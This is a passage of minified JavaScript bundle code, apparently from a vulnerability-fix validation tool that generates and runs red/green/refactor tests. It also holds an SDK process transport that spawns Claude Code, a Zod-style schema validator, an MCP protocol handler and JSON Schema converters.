          }
          
          // Execute the test
          (async () => {
            try {
              \${test.testCode}
              process.exit(0);
            } catch (error) {
              console.error('Test execution failed:', error.message);
              process.exit(1);
            }
          })();
        \`;
        
        // Write and execute test file
        const tempTestFile = '${X.replace(".test.js","")}.${J}.runner.js';
        fs.writeFileSync(tempTestFile, testFileContent);
        
        try {
          execSync(\`node \${tempTestFile}\`, { 
            cwd: '${this.repoPath}',
            stdio: 'pipe'
          });
          fs.unlinkSync(tempTestFile);
          process.exit(0);
        } catch (error) {
          fs.unlinkSync(tempTestFile);
          process.exit(1);
        }
      `,Y=X.replace(".test.js",`.${J}.wrapper.js`);return VN(Y,Q),K2(`node ${Y}`,{cwd:this.repoPath,stdio:"pipe"}),BN(Y),!0}catch(Q){return q.debug(`Test ${J} failed:`,Q),!1}}createTestFile(X){let J=(Q)=>Q.replace(/`/g,"\\`").replace(/\$/g,"\\$");return`
// Generated test file for vulnerability validation
const assert = require('assert');

module.exports = {
  red: {
    testName: "${X.red.testName}",
    testCode: \`${J(X.red.testCode)}\`,
    expectedBehavior: "${X.red.expectedBehavior}"
  },
  green: {
    testName: "${X.green.testName}",
    testCode: \`${J(X.green.testCode)}\`,
    expectedBehavior: "${X.green.expectedBehavior}"
  },
  refactor: {
    testName: "${X.refactor.testName}",
    testCode: \`${J(X.refactor.testCode)}\`,
    expectedBehavior: "${X.refactor.expectedBehavior}"
  }
};

// Export for direct execution
if (require.main === module) {
  (async () => {
    console.log('Running vulnerability validation tests...');
    
    // Run all tests
    for (const [type, test] of Object.entries(module.exports)) {
      console.log(\`Running \${type} test: \${test.testName}\`);
      try {
        await eval(test.testCode);
        console.log(\` \${type} test passed\`);
      } catch (error) {
        console.log(\` \${type} test failed: \${error.message}\`);
      }
    }
  })();
}
`}validateResults(X,J){let Q=!X.redTestPassed&&!X.greenTestPassed&&X.refactorTestPassed,Y=J.redTestPassed&&J.greenTestPassed&&J.refactorTestPassed;return Q&&Y}}var V2=j1(()=>{t1()});var DL={};Y9(DL,{tool:()=>Ty1,query:()=>DH,createSdkMcpServer:()=>_y1});import{join as ON}from"path";import{fileURLToPath as Cf1}from"url";import{setMaxListeners as Pf1}from"events";import{spawn as Tf1}from"child_process";import{createInterface as _f1}from"readline";import*as s1 from"fs";import{stat as Ef1}from"fs/promises";function bN(X=Sf1){let J=new AbortController;return Pf1(X,J.signal),J}function bf1(){return kf1}function vN(){return process.versions.bun!==void 0}class xN{options;child;childStdin;childStdout;ready=!1;abortController;exitError;exitListeners=[];processExitHandler;abortHandler;constructor(X){this.options=X,this.abortController=X.abortController||bN(),this.initialize()}initialize(){try{let{prompt:X,additionalDirectories:J=[],cwd:Q,executable:Y=vN()?"bun":"node",executableArgs:W=[],extraArgs:z={},pathToClaudeCodeExecutable:G,env:H={...process.env},stderr:U,customSystemPrompt:K,appendSystemPrompt:V,maxTurns:B,model:Z,fallbackModel:M,permissionMode:F,permissionPromptToolName:j,continueConversation:O,resume:N,allowedTools:A=[],disallowedTools:D=[],mcpServers:S,strictMcpConfig:$,canUseTool:T,includePartialMessages:k}=this.options,E=["--output-format","stream-json","--verbose"];if(K)E.push("--system-prompt",K);if(V)E.push("--append-system-prompt",V);if(B)E.push("--max-turns",B.toString());if(Z)E.push("--model",Z);if(H.DEBUG)E.push("--debug-to-stderr");if(T){if(typeof X==="string")throw new Error("canUseTool callback requires --input-format stream-json. Please set prompt as an AsyncIterable.");if(j)throw new Error("canUseTool callback cannot be used with permissionPromptToolName. Please use one or the other.");E.push("--permission-prompt-tool","stdio")}else if(j)E.push("--permission-prompt-tool",j);if(O)E.push("--continue");if(N)E.push("--resume",N);if(A.length>0)E.push("--allowedTools",A.join(","));if(D.length>0)E.push("--disallowedTools",D.join(","));if(S&&Object.keys(S).length>0)E.push("--mcp-config",JSON.stringify({mcpServers:S}));if($)E.push("--strict-mcp-config");if(F&&F!=="default")E.push("--permission-mode",F);if(M){if(Z&&M===Z)throw new Error("Fallback model cannot be the same as the main model. Please specify a different model for fallbackModel option.");E.push("--fallback-model",M)}if(k)E.push("--include-partial-messages");if(typeof X==="string")E.push("--print"),E.push("--",X.trim());else E.push("--input-format","stream-json");for(let J1 of J)E.push("--add-dir",J1);for(let[J1,H1]of Object.entries(z))if(H1===null)E.push(`--${J1}`);else E.push(`--${J1}`,H1);if(!H.CLAUDE_CODE_ENTRYPOINT)H.CLAUDE_CODE_ENTRYPOINT="sdk-ts";if(!bf1().existsSync(G)){let J1=RN(G)?`Claude Code native binary not found at ${G}. Please ensure Claude Code is installed via native installer or specify a valid path with options.pathToClaudeCodeExecutable.`:`Claude Code executable not found at ${G}. Is options.pathToClaudeCodeExecutable set?`;throw new ReferenceError(J1)}let a=RN(G),p=a?G:Y,f=a?E:[...W,G,...E];this.logDebug(a?`Spawning Claude Code native binary: ${G} ${E.join(" ")}`:`Spawning Claude Code process: ${Y} ${[...W,G,...E].join(" ")}`);let m=H.DEBUG||U?"pipe":"ignore";if(this.child=Tf1(p,f,{cwd:Q,stdio:["pipe","pipe",m],signal:this.abortController.signal,env:H}),this.childStdin=this.child.stdin,this.childStdout=this.child.stdout,typeof X==="string")this.childStdin.end(),this.childStdin=void 0;if(H.DEBUG||U)this.child.stderr.on("data",(J1)=>{if(this.logDebug(`Claude Code stderr: ${J1.toString()}`),U)U(J1.toString())});let o=()=>{if(this.child&&!this.child.killed)this.child.kill("SIGTERM")};this.processExitHandler=o,this.abortHandler=o,process.on("exit",this.processExitHandler),this.abortController.signal.addEventListener("abort",this.abortHandler),this.child.on("error",(J1)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new U7("Claude Code process aborted by user");else this.exitError=new Error(`Failed to spawn Claude Code process: ${J1.message}`),this.logDebug(this.exitError.message)}),this.child.on("close",(J1,H1)=>{if(this.ready=!1,this.abortController.signal.aborted)this.exitError=new U7("Claude Code process aborted by user");else{let d=this.getProcessExitError(J1,H1);if(d)this.exitError=d,this.logDebug(d.message)}}),this.ready=!0}catch(X){throw this.ready=!1,X}}getProcessExitError(X,J){if(X!==0&&X!==null)return new Error(`Claude Code process exited with code ${X}`);else if(J)return new Error(`Claude Code process terminated by signal ${J}`);return}logDebug(X){if(process.env.DEBUG)process.stderr.write(`${X}
`);if(this.options.stderr)this.options.stderr(X)}write(X){if(this.abortController.signal.aborted)throw new U7("Operation aborted");if(!this.ready||!this.childStdin)throw new Error("ProcessTransport is not ready for writing");if(this.child?.killed||this.child?.exitCode!==null)throw new Error("Cannot write to terminated process");if(this.exitError)throw new Error(`Cannot write to process that exited with error: ${this.exitError.message}`);if(process.env.DEBUG_SDK)process.stderr.write(`[ProcessTransport] Writing to stdin: ${X.substring(0,100)}
`);try{if(!this.childStdin.write(X)&&process.env.DEBUG_SDK)console.warn("[ProcessTransport] Write buffer full, data queued")}catch(J){throw this.ready=!1,new Error(`Failed to write to process stdin: ${J.message}`)}}close(){if(this.childStdin)this.childStdin.end(),this.childStdin=void 0;if(this.processExitHandler)process.off("exit",this.processExitHandler),this.processExitHandler=void 0;if(this.abortHandler)this.abortController.signal.removeEventListener("abort",this.abortHandler),this.abortHandler=void 0;for(let{handler:X}of this.exitListeners)this.child?.off("exit",X);if(this.exitListeners=[],this.child&&!this.child.killed)this.child.kill("SIGTERM"),setTimeout(()=>{if(this.child&&!this.child.killed)this.child.kill("SIGKILL")},5000);this.ready=!1}isReady(){return this.ready}async*readMessages(){if(!this.childStdout)throw new Error("ProcessTransport output stream not available");let X=_f1({input:this.childStdout});try{for await(let J of X)if(J.trim())yield JSON.parse(J);await this.waitForExit()}catch(J){throw J}finally{X.close()}}endInput(){if(this.childStdin)this.childStdin.end()}getInputStream(){return this.childStdin}onExit(X){if(!this.child)return()=>{};let J=(Q,Y)=>{let W=this.getProcessExitError(Q,Y);X(W)};return this.child.on("exit",J),this.exitListeners.push({callback:X,handler:J}),()=>{if(this.child)this.child.off("exit",J);let Q=this.exitListeners.findIndex((Y)=>Y.handler===J);if(Q!==-1)this.exitListeners.splice(Q,1)}}async waitForExit(){if(!this.child){if(this.exitError)throw this.exitError;return}if(this.child.exitCode!==null||this.child.killed){if(this.exitError)throw this.exitError;return}return new Promise((X,J)=>{let Q=(W,z)=>{if(this.abortController.signal.aborted){J(new U7("Operation aborted"));return}let G=this.getProcessExitError(W,z);if(G)J(G);else X()};this.child.once("exit",Q);let Y=(W)=>{this.child.off("exit",Q),J(W)};this.child.once("error",Y),this.child.once("exit",()=>{this.child.off("error",Y)})})}}function RN(X){return![".js",".mjs",".tsx",".ts",".jsx"].some((Q)=>X.endsWith(Q))}class gN{sendMcpMessage;isClosed=!1;constructor(X){this.sendMcpMessage=X}onclose;onerror;onmessage;async start(){}async send(X){if(this.isClosed)throw new Error("Transport is closed");this.sendMcpMessage(X)}async close(){if(this.isClosed)return;this.isClosed=!0,this.onclose?.()}}function ff1(X){yN=X}function q2(){return yN}function P1(X,J){let Q=q2(),Y=Z2({issueData:J,data:X.data,path:X.path,errorMaps:[X.common.contextualErrorMap,X.schemaErrorMap,Q,Q===B7?void 0:B7].filter((W)=>!!W)});X.common.issues.push(Y)}class A9{constructor(){this.value="valid"}dirty(){if(this.value==="valid")this.value="dirty"}abort(){if(this.value!=="aborted")this.value="aborted"}static mergeArray(X,J){let Q=[];for(let Y of J){if(Y.status==="aborted")return a1;if(Y.status==="dirty")X.dirty();Q.push(Y.value)}return{status:X.value,value:Q}}static async mergeObjectAsync(X,J){let Q=[];for(let Y of J){let W=await Y.key,z=await Y.value;Q.push({key:W,value:z})}return A9.mergeObjectSync(X,Q)}static mergeObjectSync(X,J){let Q={};for(let Y of J){let{key:W,value:z}=Y;if(W.status==="aborted")return a1;if(z.status==="aborted")return a1;if(W.status==="dirty")X.dirty();if(z.status==="dirty")X.dirty();if(W.value!=="__proto__"&&(typeof z.value!=="undefined"||Y.alwaysSet))Q[W.value]=z.value}return{status:X.value,value:Q}}}class v8{constructor(X,J,Q,Y){this._cachedPath=[],this.parent=X,this.data=J,this._path=Q,this._key=Y}get path(){if(!this._cachedPath.length)if(Array.isArray(this._key))this._cachedPath.push(...this._path,...this._key);else this._cachedPath.push(...this._path,this._key);return this._cachedPath}}function z0(X){if(!X)return{};let{errorMap:J,invalid_type_error:Q,required_error:Y,description:W}=X;if(J&&(Q||Y))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(J)return{errorMap:J,description:W};return{errorMap:(G,H)=>{let{message:U}=X;if(G.code==="invalid_enum_value")return{message:U??H.defaultError};if(typeof H.data==="undefined")return{message:U??Y??H.defaultError};if(G.code!=="invalid_type")return{message:H.defaultError};return{message:U??Q??H.defaultError}},description:W}}class H0{get description(){return this._def.description}_getType(X){return T6(X.data)}_getOrReturnCtx(X,J){return J||{common:X.parent.common,data:X.data,parsedType:T6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}_processInputParams(X){return{status:new A9,ctx:{common:X.parent.common,data:X.data,parsedType:T6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}}_parseSync(X){let J=this._parse(X);if(YQ(J))throw new Error("Synchronous parse encountered promise.");return J}_parseAsync(X){let J=this._parse(X);return Promise.resolve(J)}parse(X,J){let Q=this.safeParse(X,J);if(Q.success)return Q.data;throw Q.error}safeParse(X,J){let Q={common:{issues:[],async:J?.async??!1,contextualErrorMap:J?.errorMap},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:T6(X)},Y=this._parseSync({data:X,path:Q.path,parent:Q});return AN(Q,Y)}"~validate"(X){let J={common:{issues:[],async:!!this["~standard"].async},path:[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:T6(X)};if(!this["~standard"].async)try{let Q=this._parseSync({data:X,path:[],parent:J});return rX(Q)?{value:Q.value}:{issues:J.common.issues}}catch(Q){if(Q?.message?.toLowerCase()?.includes("encountered"))this["~standard"].async=!0;J.common={issues:[],async:!0}}return this._parseAsync({data:X,path:[],parent:J}).then((Q)=>rX(Q)?{value:Q.value}:{issues:J.common.issues})}async parseAsync(X,J){let Q=await this.safeParseAsync(X,J);if(Q.success)return Q.data;throw Q.error}async safeParseAsync(X,J){let Q={common:{issues:[],contextualErrorMap:J?.errorMap,async:!0},path:J?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:T6(X)},Y=this._parse({data:X,path:Q.path,parent:Q}),W=await(YQ(Y)?Y:Promise.resolve(Y));return AN(Q,W)}refine(X,J){let Q=(Y)=>{if(typeof J==="string"||typeof J==="undefined")return{message:J};else if(typeof J==="function")return J(Y);else return J};return this._refinement((Y,W)=>{let z=X(Y),G=()=>W.addIssue({code:F1.custom,...Q(Y)});if(typeof Promise!=="undefined"&&z instanceof Promise)return z.then((H)=>{if(!H)return G(),!1;else return!0});if(!z)return G(),!1;else return!0})}refinement(X,J){return this._refinement((Q,Y)=>{if(!X(Q))return Y.addIssue(typeof J==="function"?J(Q,Y):J),!1;else return!0})}_refinement(X){return new K8({schema:this,typeName:R1.ZodEffects,effect:{type:"refinement",refinement:X}})}superRefine(X){return this._refinement(X)}constructor(X){this.spa=this.safeParseAsync,this._def=X,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this),this["~standard"]={version:1,vendor:"zod",validate:(J)=>this["~validate"](J)}}optional(){return U8.create(this,this._def)}nullable(){return _6.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return b8.create(this)}promise(){return oX.create(this,this._def)}or(X){return F7.create([this,X],this._def)}and(X){return j7.create(this,X,this._def)}transform(X){return new K8({...z0(this._def),schema:this,typeName:R1.ZodEffects,effect:{type:"transform",transform:X}})}default(X){let J=typeof X==="function"?X:()=>X;return new N7({...z0(this._def),innerType:this,defaultValue:J,typeName:R1.ZodDefault})}brand(){return new O2({typeName:R1.ZodBranded,type:this,...z0(this._def)})}catch(X){let J=typeof X==="function"?X:()=>X;return new L7({...z0(this._def),innerType:this,catchValue:J,typeName:R1.ZodCatch})}describe(X){return new this.constructor({...this._def,description:X})}pipe(X){return KQ.create(this,X)}readonly(){return D7.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}function uN(X){let J="[0-5]\\d";if(X.precision)J=`${J}\\.\\d{${X.precision}}`;else if(X.precision==null)J=`${J}(\\.\\d+)?`;let Q=X.precision?"+":"?";return`([01]\\d|2[0-3]):[0-5]\\d(:${J})${Q}`}function Xg1(X){return new RegExp(`^${uN(X)}$`)}function cN(X){let J=`${mN}T${uN(X)}`,Q=[];if(Q.push(X.local?"Z?":"Z"),X.offset)Q.push("([+-]\\d{2}:?\\d{2})");return J=`${J}(${Q.join("|")})`,new RegExp(`^${J}$`)}function Jg1(X,J){if((J==="v4"||!J)&&rf1.test(X))return!0;if((J==="v6"||!J)&&af1.test(X))return!0;return!1}function Qg1(X,J){if(!lf1.test(X))return!1;try{let[Q]=X.split(".");if(!Q)return!1;let Y=Q.replace(/-/g,"+").replace(/_/g,"/").padEnd(Q.length+(4-Q.length%4)%4,"="),W=JSON.parse(atob(Y));if(typeof W!=="object"||W===null)return!1;if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(J&&W.alg!==J)return!1;return!0}catch{return!1}}function Yg1(X,J){if((J==="v4"||!J)&&nf1.test(X))return!0;if((J==="v6"||!J)&&sf1.test(X))return!0;return!1}function Wg1(X,J){let Q=(X.toString().split(".")[1]||"").length,Y=(J.toString().split(".")[1]||"").length,W=Q>Y?Q:Y,z=Number.parseInt(X.toFixed(W).replace(".","")),G=Number.parseInt(J.toFixed(W).replace(".",""));return z%G/10**W}function H7(X){if(X instanceof p0){let J={};for(let Q in X.shape){let Y=X.shape[Q];J[Q]=U8.create(H7(Y))}return new p0({...X._def,shape:()=>J})}else if(X instanceof b8)return new b8({...X._def,type:H7(X.element)});else if(X instanceof U8)return U8.create(H7(X.unwrap()));else if(X instanceof _6)return _6.create(H7(X.unwrap()));else if(X instanceof Q6)return Q6.create(X.items.map((J)=>H7(J)));else return X}function JH(X,J){let Q=T6(X),Y=T6(J);if(X===J)return{valid:!0,data:X};else if(Q===T1.object&&Y===T1.object){let W=N0.objectKeys(J),z=N0.objectKeys(X).filter((H)=>W.indexOf(H)!==-1),G={...X,...J};for(let H of z){let U=JH(X[H],J[H]);if(!U.valid)return{valid:!1};G[H]=U.data}return{valid:!0,data:G}}else if(Q===T1.array&&Y===T1.array){if(X.length!==J.length)return{valid:!1};let W=[];for(let z=0;z<X.length;z++){let G=X[z],H=J[z],U=JH(G,H);if(!U.valid)return{valid:!1};W.push(U.data)}return{valid:!0,data:W}}else if(Q===T1.date&&Y===T1.date&&+X===+J)return{valid:!0,data:X};else return{valid:!1}}function lN(X,J){return new HX({values:X,typeName:R1.ZodEnum,...z0(J)})}function NN(X,J){let Q=typeof X==="function"?X(J):typeof X==="string"?{message:X}:X;return typeof Q==="string"?{message:Q}:Q}function pN(X,J={},Q){if(X)return aX.create().superRefine((Y,W)=>{let z=X(Y);if(z instanceof Promise)return z.then((G)=>{if(!G){let H=NN(J,Y),U=H.fatal??Q??!0;W.addIssue({code:"custom",...H,fatal:U})}});if(!z){let G=NN(J,Y),H=G.fatal??Q??!0;W.addIssue({code:"custom",...G,fatal:H})}return});return aX.create()}class ML{constructor(X){this._options=X,this._requestMessageId=0,this._requestHandlers=new Map,this._requestHandlerAbortControllers=new Map,this._notificationHandlers=new Map,this._responseHandlers=new Map,this._progressHandlers=new Map,this._timeoutInfo=new Map,this._pendingDebouncedNotifications=new Set,this.setNotificationHandler(FH,(J)=>{let Q=this._requestHandlerAbortControllers.get(J.params.requestId);Q===null||Q===void 0||Q.abort(J.params.reason)}),this.setNotificationHandler(OH,(J)=>{this._onprogress(J)}),this.setRequestHandler(jH,(J)=>({}))}_setupTimeout(X,J,Q,Y,W=!1){this._timeoutInfo.set(X,{timeoutId:setTimeout(Y,J),startTime:Date.now(),timeout:J,maxTotalTimeout:Q,resetTimeoutOnProgress:W,onTimeout:Y})}_resetTimeout(X){let J=this._timeoutInfo.get(X);if(!J)return!1;let Q=Date.now()-J.startTime;if(J.maxTotalTimeout&&Q>=J.maxTotalTimeout)throw this._timeoutInfo.delete(X),new n0(l0.RequestTimeout,"Maximum total timeout exceeded",{maxTotalTimeout:J.maxTotalTimeout,totalElapsed:Q});return clearTimeout(J.timeoutId),J.timeoutId=setTimeout(J.onTimeout,J.timeout),!0}_cleanupTimeout(X){let J=this._timeoutInfo.get(X);if(J)clearTimeout(J.timeoutId),this._timeoutInfo.delete(X)}async connect(X){var J,Q,Y;this._transport=X;let W=(J=this.transport)===null||J===void 0?void 0:J.onclose;this._transport.onclose=()=>{W===null||W===void 0||W(),this._onclose()};let z=(Q=this.transport)===null||Q===void 0?void 0:Q.onerror;this._transport.onerror=(H)=>{z===null||z===void 0||z(H),this._onerror(H)};let G=(Y=this._transport)===null||Y===void 0?void 0:Y.onmessage;this._transport.onmessage=(H,U)=>{if(G===null||G===void 0||G(H,U),DN(H)||rg1(H))this._onresponse(H);else if(dg1(H))this._onrequest(H,U);else if(ig1(H))this._onnotification(H);else this._onerror(new Error(`Unknown message type: ${JSON.stringify(H)}`))},await this._transport.start()}_onclose(){var X;let J=this._responseHandlers;this._responseHandlers=new Map,this._progressHandlers.clear(),this._pendingDebouncedNotifications.clear(),this._transport=void 0,(X=this.onclose)===null||X===void 0||X.call(this);let Q=new n0(l0.ConnectionClosed,"Connection closed");for(let Y of J.values())Y(Q)}_onerror(X){var J;(J=this.onerror)===null||J===void 0||J.call(this,X)}_onnotification(X){var J;let Q=(J=this._notificationHandlers.get(X.method))!==null&&J!==void 0?J:this.fallbackNotificationHandler;if(Q===void 0)return;Promise.resolve().then(()=>Q(X)).catch((Y)=>this._onerror(new Error(`Uncaught error in notification handler: ${Y}`)))}_onrequest(X,J){var Q,Y;let W=(Q=this._requestHandlers.get(X.method))!==null&&Q!==void 0?Q:this.fallbackRequestHandler,z=this._transport;if(W===void 0){z===null||z===void 0||z.send({jsonrpc:"2.0",id:X.id,error:{code:l0.MethodNotFound,message:"Method not found"}}).catch((U)=>this._onerror(new Error(`Failed to send an error response: ${U}`)));return}let G=new AbortController;this._requestHandlerAbortControllers.set(X.id,G);let H={signal:G.signal,sessionId:z===null||z===void 0?void 0:z.sessionId,_meta:(Y=X.params)===null||Y===void 0?void 0:Y._meta,sendNotification:(U)=>this.notification(U,{relatedRequestId:X.id}),sendRequest:(U,K,V)=>this.request(U,K,{...V,relatedRequestId:X.id}),authInfo:J===null||J===void 0?void 0:J.authInfo,requestId:X.id,requestInfo:J===null||J===void 0?void 0:J.requestInfo};Promise.resolve().then(()=>W(X,H)).then((U)=>{if(G.signal.aborted)return;return z===null||z===void 0?void 0:z.send({result:U,jsonrpc:"2.0",id:X.id})},(U)=>{var K;if(G.signal.aborted)return;return z===null||z===void 0?void 0:z.send({jsonrpc:"2.0",id:X.id,error:{code:Number.isSafeInteger(U.code)?U.code:l0.InternalError,message:(K=U.message)!==null&&K!==void 0?K:"Internal error"}})}).catch((U)=>this._onerror(new Error(`Failed to send response: ${U}`))).finally(()=>{this._requestHandlerAbortControllers.delete(X.id)})}_onprogress(X){let{progressToken:J,...Q}=X.params,Y=Number(J),W=this._progressHandlers.get(Y);if(!W){this._onerror(new Error(`Received a progress notification for an unknown token: ${JSON.stringify(X)}`));return}let z=this._responseHandlers.get(Y),G=this._timeoutInfo.get(Y);if(G&&z&&G.resetTimeoutOnProgress)try{this._resetTimeout(Y)}catch(H){z(H);return}W(Q)}_onresponse(X){let J=Number(X.id),Q=this._responseHandlers.get(J);if(Q===void 0){this._onerror(new Error(`Received a response for an unknown message ID: ${JSON.stringify(X)}`));return}if(this._responseHandlers.delete(J),this._progressHandlers.delete(J),this._cleanupTimeout(J),DN(X))Q(X);else{let Y=new n0(X.error.code,X.error.message,X.error.data);Q(Y)}}get transport(){return this._transport}async close(){var X;await((X=this._transport)===null||X===void 0?void 0:X.close())}request(X,J,Q){let{relatedRequestId:Y,resumptionToken:W,onresumptiontoken:z}=Q!==null&&Q!==void 0?Q:{};return new Promise((G,H)=>{var U,K,V,B,Z,M;if(!this._transport){H(new Error("Not connected"));return}if(((U=this._options)===null||U===void 0?void 0:U.enforceStrictCapabilities)===!0)this.assertCapabilityForMethod(X.method);(K=Q===null||Q===void 0?void 0:Q.signal)===null||K===void 0||K.throwIfAborted();let F=this._requestMessageId++,j={...X,jsonrpc:"2.0",id:F};if(Q===null||Q===void 0?void 0:Q.onprogress)this._progressHandlers.set(F,Q.onprogress),j.params={...X.params,_meta:{...((V=X.params)===null||V===void 0?void 0:V._meta)||{},progressToken:F}};let O=(D)=>{var S;this._responseHandlers.delete(F),this._progressHandlers.delete(F),this._cleanupTimeout(F),(S=this._transport)===null||S===void 0||S.send({jsonrpc:"2.0",method:"notifications/cancelled",params:{requestId:F,reason:String(D)}},{relatedRequestId:Y,resumptionToken:W,onresumptiontoken:z}).catch(($)=>this._onerror(new Error(`Failed to send cancellation: ${$}`))),H(D)};this._responseHandlers.set(F,(D)=>{var S;if((S=Q===null||Q===void 0?void 0:Q.signal)===null||S===void 0?void 0:S.aborted)return;if(D instanceof Error)return H(D);try{let $=J.parse(D.result);G($)}catch($){H($)}}),(B=Q===null||Q===void 0?void 0:Q.signal)===null||B===void 0||B.addEventListener("abort",()=>{var D;O((D=Q===null||Q===void 0?void 0:Q.signal)===null||D===void 0?void 0:D.reason)});let N=(Z=Q===null||Q===void 0?void 0:Q.timeout)!==null&&Z!==void 0?Z:fh1,A=()=>O(new n0(l0.RequestTimeout,"Request timed out",{timeout:N}));this._setupTimeout(F,N,Q===null||Q===void 0?void 0:Q.maxTotalTimeout,A,(M=Q===null||Q===void 0?void 0:Q.resetTimeoutOnProgress)!==null&&M!==void 0?M:!1),this._transport.send(j,{relatedRequestId:Y,resumptionToken:W,onresumptiontoken:z}).catch((D)=>{this._cleanupTimeout(F),H(D)})})}async notification(X,J){var Q,Y;if(!this._transport)throw new Error("Not connected");if(this.assertNotificationCapability(X.method),((Y=(Q=this._options)===null||Q===void 0?void 0:Q.debouncedNotificationMethods)!==null&&Y!==void 0?Y:[]).includes(X.method)&&!X.params&&!(J===null||J===void 0?void 0:J.relatedRequestId)){if(this._pendingDebouncedNotifications.has(X.method))return;this._pendingDebouncedNotifications.add(X.method),Promise.resolve().then(()=>{var H;if(this._pendingDebouncedNotifications.delete(X.method),!this._transport)return;let U={...X,jsonrpc:"2.0"};(H=this._transport)===null||H===void 0||H.send(U,J).catch((K)=>this._onerror(K))});return}let G={...X,jsonrpc:"2.0"};await this._transport.send(G,J)}setRequestHandler(X,J){let Q=X.shape.method.value;this.assertRequestHandlerCapability(Q),this._requestHandlers.set(Q,(Y,W)=>{return Promise.resolve(J(X.parse(Y),W))})}removeRequestHandler(X){this._requestHandlers.delete(X)}assertCanSetRequestHandler(X){if(this._requestHandlers.has(X))throw new Error(`A request handler for ${X} already exists, which would be overridden`)}setNotificationHandler(X,J){this._notificationHandlers.set(X.shape.method.value,(Q)=>Promise.resolve(J(X.parse(Q))))}removeNotificationHandler(X){this._notificationHandlers.delete(X)}}function gh1(X,J){return Object.entries(J).reduce((Q,[Y,W])=>{if(W&&typeof W==="object")Q[Y]=Q[Y]?{...Q[Y],...W}:W;else Q[Y]=W;return Q},{...X})}function jL(X,J,Q,Y){if(!Y?.errorMessages)return;if(Q)X.errorMessage={...X.errorMessage,[J]:Q}}function _0(X,J,Q,Y,W){X[J]=Q,jL(X,J,Y,W)}function ch1(){return{}}function lh1(X,J){let Q={type:"array"};if(X.type?._def&&X.type?._def?.typeName!==R1.ZodAny)Q.items=P0(X.type._def,{...J,currentPath:[...J.currentPath,"items"]});if(X.minLength)_0(Q,"minItems",X.minLength.value,X.minLength.message,J);if(X.maxLength)_0(Q,"maxItems",X.maxLength.value,X.maxLength.message,J);if(X.exactLength)_0(Q,"minItems",X.exactLength.value,X.exactLength.message,J),_0(Q,"maxItems",X.exactLength.value,X.exactLength.message,J);return Q}function ph1(X,J){let Q={type:"integer",format:"int64"};if(!X.checks)return Q;for(let Y of X.checks)switch(Y.kind){case"min":if(J.target==="jsonSchema7")if(Y.inclusive)_0(Q,"minimum",Y.value,Y.message,J);else _0(Q,"exclusiveMinimum",Y.value,Y.message,J);else{if(!Y.inclusive)Q.exclusiveMinimum=!0;_0(Q,"minimum",Y.value,Y.message,J)}break;case"max":if(J.target==="jsonSchema7")if(Y.inclusive)_0(Q,"maximum",Y.value,Y.message,J);else _0(Q,"exclusiveMaximum",Y.value,Y.message,J);else{if(!Y.inclusive)Q.exclusiveMaximum=!0;_0(Q,"maximum",Y.value,Y.message,J)}break;case"multipleOf":_0(Q,"multipleOf",Y.value,Y.message,J);break}return Q}function dh1(){return{type:"boolean"}}function OL(X,J){return P0(X.type._def,J)}function RL(X,J,Q){let Y=Q??J.dateStrategy;if(Array.isArray(Y))return{anyOf:Y.map((W,z)=>RL(X,J,W))};switch(Y){case"string":case"format:date-time":return{type:"string",format:"date-time"};case"format:date":return{type:"string",format:"date"};case"integer":return rh1(X,J)}}function nh1(X,J){return{...P0(X.innerType._def,J),default:X.defaultValue()}}function ah1(X,J){return J.effectStrategy==="input"?P0(X.schema._def,J):{}}function sh1(X){return{type:"string",enum:Array.from(X.values)}}function th1(X,J){let Q=[P0(X.left._def,{...J,currentPath:[...J.currentPath,"allOf","0"]}),P0(X.right._def,{...J,currentPath:[...J.currentPath,"allOf","1"]})].filter((z)=>!!z),Y=J.target==="jsonSchema2019-09"?{unevaluatedProperties:!1}:void 0,W=[];return Q.forEach((z)=>{if(oh1(z)){if(W.push(...z.allOf),z.unevaluatedProperties===void 0)Y=void 0}else{let G=z;if("additionalProperties"in z&&z.additionalProperties===!1){let{additionalProperties:H,...U}=z;G=U}else Y=void 0;W.push(G)}}),W.length?{allOf:W,...Y}:void 0}function eh1(X,J){let Q=typeof X.value;if(Q!=="bigint"&&Q!=="number"&&Q!=="boolean"&&Q!=="string")return{type:Array.isArray(X.value)?"array":"object"};if(J.target==="openApi3")return{type:Q==="bigint"?"integer":Q,enum:[X.value]};return{type:Q==="bigint"?"integer":Q,const:X.value}}function AL(X,J){let Q={type:"string"};if(X.checks)for(let Y of X.checks)switch(Y.kind){case"min":_0(Q,"minLength",typeof Q.minLength==="number"?Math.max(Q.minLength,Y.value):Y.value,Y.message,J);break;case"max":_0(Q,"maxLength",typeof 